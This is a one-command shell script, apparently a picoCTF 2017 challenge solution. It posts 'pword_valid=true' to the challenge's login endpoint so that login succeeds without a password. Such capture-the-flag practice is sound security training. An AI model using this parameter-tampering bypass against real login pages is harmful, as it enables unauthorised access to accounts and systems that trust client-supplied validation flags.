#!/bin/sh

curl 'http://shell2017.picoctf.com:4370/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'pword_valid=true'
